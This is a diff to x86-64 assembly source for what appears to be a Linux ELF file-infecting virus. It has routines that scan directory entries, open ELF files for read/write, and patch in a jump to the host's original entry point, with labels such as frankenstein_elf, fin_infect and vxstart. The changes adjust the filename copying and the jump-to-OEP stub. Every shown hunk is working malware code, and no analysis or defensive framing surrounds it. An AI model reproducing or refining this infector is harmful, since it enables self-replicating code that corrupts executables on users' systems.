@@ -421,8 +421,8 @@ process_dirents:
 check_file:
 	push rcx
 	check_elf:
-		lea r12, [rcx + r14 + 618]
-		mov [r14 + 160], r12
+		;lea r12, [rcx + r14 + 618]
+		;mov [r14 + 160], r12
 		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
 		mov rsi, 0x2 						;flags - read/write (OPEN_RDWR) in rsi
 		xor rdx, rdx						;mode - 0
@@ -437,7 +437,8 @@ check_file:
 		xor r12, r12
 		mov rsi, rdi
 		lea rdi, [r14 + 200] 
-		mov rsi, [r14 + 160]	
+		lea rsi, [rdi]
+		;mov rsi, [r14 + 160]	
 		.copy_filename:
 			mov byte al, [rsi]
 			inc rsi
@@ -893,11 +894,13 @@ frankenstein_elf:
 
 	.write_jmp_to_oep:
 		xor r11, r11
-		mov r11, qword [r14 + 448]
+		;mov r11, qword [r14 + 448]
+		lea r11, [rel _start]
 		mov rdx, 12
 		mov byte [r14 + 150], 0x48			;0x488d05 = lea rax
 		;mov byte [r14 + 151], 0x8d			
 		mov byte [r14 + 151], 0xb8			
+		;mov byte [r14 + 151], 0x8b			
 		;mov byte [r14 + 152], 0x84			
 		;mov byte [r14 + 153], 0x24			
 		;mov byte [r14 + 154], 0xC0			
@@ -910,6 +913,8 @@ frankenstein_elf:
 		;mov byte [r14 + 157], 0x00			;0xff 0xe0 = jump eax
 		mov byte [r14 + 160], 0xff			;0xff 0xe0 = jump eax
 		mov byte [r14 + 161], 0xe0			;0xff 0xe0 = jump eax
+		;mov byte [r14 + 156], 0xff			;0xff 0xe0 = jump eax
+		;mov byte [r14 + 157], 0xe0			;0xff 0xe0 = jump eax
 		;mov byte [r14 + 150], 0x68			;0x68 = push
 		;mov dword [r14 + 151], r11d			;address of original host entry point
 		;mov byte [r14 + 155], 0xc3			;0xc3 = ret
@@ -992,9 +997,9 @@ frankenstein_elf:
 		syscall
 fin_infect:
 	ret
-jmp_to_oep:
-	mov rax, [rsp + 448]
-	jmp rax
+;jmp_to_oep:
+;	mov rax, [rsp + 448]
+;	jmp rax
 PAGESIZE: dd 4096	
 ;;restore stack to original state
 _restore:
@@ -1002,7 +1007,7 @@ _restore:
 	mov rsp, rbp
 	pop rbp
 
-vlen equ $-_start
+vlen equ $-vxstart
 vend:
 _end:
 	xor rdi, rdi
